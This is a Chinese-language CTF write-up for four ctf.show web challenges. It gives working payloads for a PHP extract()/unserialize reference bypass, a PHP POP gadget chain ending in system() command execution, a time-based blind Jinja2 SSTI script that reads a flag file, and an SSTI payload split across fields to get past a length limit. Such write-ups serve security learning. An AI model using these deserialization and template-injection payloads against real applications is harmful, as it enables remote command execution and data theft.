# 给我看看
## 解题思路
> 利用`extract()`函数来进行变量覆盖，在后面覆盖掉之前的`$secret`的值来绕过`die()`从而进行反序列化，`$you_never_know`是编码后的随机数采用`&`引用来进行绕过

## Payload
```php
<?php
class whoami{
    public $your_answer;

    public function __construct(){
        $this->your_answer=&$this->name;
    }
}

echo serialize(new whoami());
```
```
GET: ?s=给我看看!
POST: secret=O:6:"whoami":2:{s:11:"your_answer";N;s:4:"name";R:2;}
```

# easyPOP
## 解题思路
> 类`action_3`中`urlencode($this->str)`触发类`action_1`中的`__toString()`方法，接着调用类`action_2`中的`__get()`方法来触发类`action_4`中的`__invoke()`方法，接着进一步调用类`action_3`中`__construct()`的`system()`命令执行方法从而来获取`Flag`
## Payload
```php
<?php
class action_3 {
    public $str;
    public function __construct() {
        $this->str = new action_1();
    }
}

class action_1 {
    public $tmp;
    public function __construct() {
        $this->tmp = new action_2();
    }
}

class action_2 {
    public $p;
    public function __construct() {
        $this->p = new action_4();
    }
}

class action_4 {
    public $ctf;
    public $show;
    public function __construct() {
        $this->ctf = "action_3";
        $this->show = "cat /fz3_.txt";
        # $this->show = "ls /";
    }
}
echo serialize(new action_3());
?>
```
```
GET: ?pop=O:8:"action_3":1:{s:3:"str";O:8:"action_1":1:{s:3:"tmp";O:8:"action_2":1:{s:1:"p";O:8:"action_4":2:{s:3:"ctf";s:8:"action_3";s:4:"show";s:13:"cat /fz3_.txt";}}}}
```

# 近在眼前
## 解题思路
> 给出的源码如下，用延时注入来打`ssti`即可

```python
#!/usr/bin/env python3

from flask import Flask, render_template_string, request
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

app = Flask(__name__)
limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["10000 per hour"]
)


@limiter.limit("5/second", override_defaults=True)
@app.route('/')
def index():
    return ("\x3cpre\x3e\x3ccode\x3e%s\x3c/code\x3e\x3c/pre\x3e")%open(__file__).read()


@limiter.limit("5/second", override_defaults=True)
@app.route('/ssti')
def check():
    flag = open("/app/flag.txt", 'r').read().strip()
    if "input" in request.args:
        query = request.args["input"]
        render_template_string(query)
        return "Thank you for your input."
    return "No input found."


app.run('0.0.0.0', 80)
```

## Payload
```python
import requests
import string
s=string.digits+'abcdef-}'
flag="ctfshow{"
url="http://6387c986-012c-4394-8602-b45083a22b4b.challenge.ctf.show//ssti?input={%25 set flag=config.__class__.__init__.__globals__['os'].popen('cat /app/flag.txt').read()%25}{%25 set sleep=config.__class__.__init__.__globals__['os'].popen('sleep 3')%25}"
for i in range(50):
    print(i)
    for j in s:
        k=flag+j
        u=url+"{%25if '"+k+"' in flag%25}{{sleep.read()}}{%25endif%25}"
        try:
            requests.get(u,timeout=(2.5,2.5))
        except Exception as e:
            flag=k
            print(flag)
            break
```

# 谁是CTF之王？
## 解题思路
> 源码
```python
from flask import Flask, render_template_string, request, send_from_directory


app = Flask(__name__)

@app.route('/')
def index():
    return send_from_directory('html', 'index.html')

@app.route('/ssti.html')
def ssti():
    return send_from_directory('html', 'ssti.html')

@app.route('/madlib', methods=['POST'])
def madlib():
    if len(request.json) == 5:
        verb = request.json.get('verb')
        noun = request.json.get('noun')
        adjective = request.json.get('adjective')
        person = request.json.get('person')
        place = request.json.get('place')
        params = [verb, noun, adjective, person, place]
        if any(len(i) > 21 for i in params):
            return 'your words must not be longer than 21 characters!', 403
        madlib = f'To find out what this is you must {verb} the internet then get to the {noun} system through the visual MAC hard drive and program the open-source but overriding the bus won\'t do anything so you need to parse the online SSD transmitter, then index the neural DHCP card {adjective}.{person} taught me this trick when we met in {place} allowing you to download the knowledge of what this is directly to your brain.'
        return render_template_string(madlib)
    return 'This madlib only takes five words', 403

@app.route('/source')
def show_source():
    return send_from_directory('/app/', 'app.py')

app.run('0.0.0.0', port=80)
```

> 之前做过一道国外的题目和这个题目基本是一样的，利用输入框`adjective`和`person`之间的可连接性来突破长度限制从而来构造`ssti`注入

## Payload
```python
import requests
import re

host = 'http://5079b840-9b43-4d07-ae17-db80564e96a6.challenge.ctf.show'
port = '80'

url = f'http://{host}:{port}/madlib'
payload = {
        "verb":"{%set x=config%}",
        "noun":"{%set x=x.__init__%}",
        "adjective":"{%set x=x.__globals__",
        "person":"os.popen('cat f*')%}",
        "place":"{{x.read()}}"
        }

r = requests.post(url, json=payload)

flag = re.findall(r'ctfshow{.*}', r.text)[0]

print(flag)
```